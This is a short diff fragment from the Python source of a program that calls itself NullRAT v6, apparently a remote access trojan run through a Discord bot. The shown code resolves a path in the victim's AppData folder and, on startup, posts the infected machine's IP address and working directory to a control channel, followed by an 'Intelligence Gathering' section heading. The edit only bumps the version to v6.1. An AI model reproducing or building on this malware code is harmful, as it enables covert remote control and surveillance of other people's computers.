@@ -15,7 +15,7 @@ nr_working = f"C:\\Users\\{os.getenv('username')}\\Appdata"
 @client.event
 async def on_ready():
     await client.get_channel(notification_channel).send(
-        embed=Embed(title = f"NullRAT v6 started on {IP()}\nCurrently present in {original_dir}")
+        embed=Embed(title = f"NullRAT v6.1 started on {IP()}\nCurrently present in {original_dir}")
     )
 
 # Intelligence Gathering #
